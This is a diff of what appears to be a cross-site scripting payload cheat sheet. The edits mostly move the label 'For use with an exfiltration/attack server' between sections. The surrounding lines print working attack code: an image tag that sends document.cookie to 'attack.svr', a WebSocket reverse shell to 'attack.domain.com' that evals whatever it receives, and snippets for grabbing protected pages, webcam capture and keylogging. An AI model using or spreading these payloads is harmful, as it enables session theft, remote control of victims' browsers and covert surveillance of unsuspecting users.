@@ -244,7 +244,6 @@ document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 
 ### Grab Protected Pages
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 ```
 fetch('/protected_page')
@@ -259,6 +258,8 @@ fetch('/protected_page')
 ```
 
 ### Grab Specific Page Data
+
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 #### Page Area {div, span, etc}
 
@@ -289,6 +290,8 @@ html2canvas(document.body)
 
 ### Forced Download
 
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
+
 #### Macro Document
 
 ```
@@ -316,7 +319,7 @@ document.body.appendChild(frame)
 
 ### Capture Data From Webcam
 
-~ Requires attack server~
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 ```
 vid_element = document.createElement('video')
@@ -341,7 +344,7 @@ navigator.mediaDevices.getUserMedia({video:true})
 
 ### Reverse Shell
 
-~ Requires attack server/listener ~
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 ```
 sock = new WebSocket('wss://attack.domain.com')
@@ -349,6 +352,8 @@ sock.onmessage = event => eval(e.data)
 ```
 
 ### Run Keylogger
+
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 ```
 document.addEventListener('change', element => {
